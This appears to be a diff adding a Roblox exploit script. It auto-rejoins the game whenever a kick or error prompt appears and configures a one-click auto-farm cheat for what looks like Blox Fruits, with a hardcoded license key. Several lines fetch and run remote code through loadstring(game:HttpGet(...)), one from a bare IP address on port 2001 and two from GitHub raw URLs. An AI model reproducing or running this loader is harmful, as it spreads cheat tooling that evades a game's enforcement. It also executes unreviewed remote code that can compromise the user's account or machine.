@@ -1,0 +1,69 @@
+repeat task.wait(0.3) until game:IsLoaded() and game.Players and game.Players.LocalPlayer and game.Players.LocalPlayer:FindFirstChild("PlayerGui")
+function CheckKick(v)
+        if v.Name == "ErrorPrompt" then
+            task.wait(2)
+            print(v.TitleFrame.ErrorTitle.Text)
+            if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
+                if String.find(v.MessageArea.ErrorFrame.ErrorMessage, "Unable to join game") then
+                    while task.wait() do
+                    end
+                end
+            else
+                v:Destroy()
+                while task.wait() do 
+                    game:GetService("TeleportService"):Teleport(game.PlaceId)
+                end
+            end
+        end
+    end
+
+    game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(CheckKick)
+
+task.spawn(function()
+    if _G.Genhubsnexus ~= true then
+           loadstring(game:HttpGet("http://103.253.74.160:2001/script?game=nexus", true))()
+    end
+end)
+task.wait(.3)
+task.spawn(function()
+    	loadstring(game:HttpGet("https://raw.githubusercontent.com/P9INC/brsold/refs/heads/main/sosoft", true))()
+end)
+task.spawn(function()
+getgenv().Mode = "OneClick"
+getgenv().QuartyzScript = {
+    ["Team"] = "Pirates", -- Options "Pirates", "Marines"
+    ["FucusOnLevel"] = true,
+    ["Fruits"] = {  -- setting for fruits u want
+        ["Primary"] = { -- if current fruit is not in this list, eat/buy
+            "Dough-Dough",
+            "Buddha-Buddha",
+            -- u can configs add mores/remove and must end with , (comma symbol)
+        },
+        ["Normal"] = { -- it just a normal fruit list
+            "Magma-Magma",
+            "Ice-Ice",
+            -- u can configs add mores/remove and must end with , (comma symbol)
+        }
+        -- run this for get all fruit name `local t={};for _,v in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("GetFruits"))do table.insert(t,v.Name)end;setclipboard(table.concat(t, "\n"))`
+    },
+    ["Lock Fruits"] = { -- don't use or eat fruits in this list
+        "Dragon-Dragon",
+        "Kitsune-Kitsune",
+        "Tiger-Tiger",
+	"T-Rex-T-Rex",
+	"Dough-Dough",
+	"Control-Control",
+	"Gas-Gas",
+	"Mammoth-Mammoth",
+	"Lightning-Lightning"
+    },
+    ["IdleCheck"] = 300, -- every (x) seconds if not moving rejoin
+    ["Swords"] = {
+        ["Shark Anchor"] = false
+    },
+
+    ["Fragments Cap"] = 50000
+};
+getgenv().license_key = "f15488c277d38cd8cf6d53163bda8e87"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xQuartyx/QuartyzScript/main/OneClick/loader.lua"))()
+end)
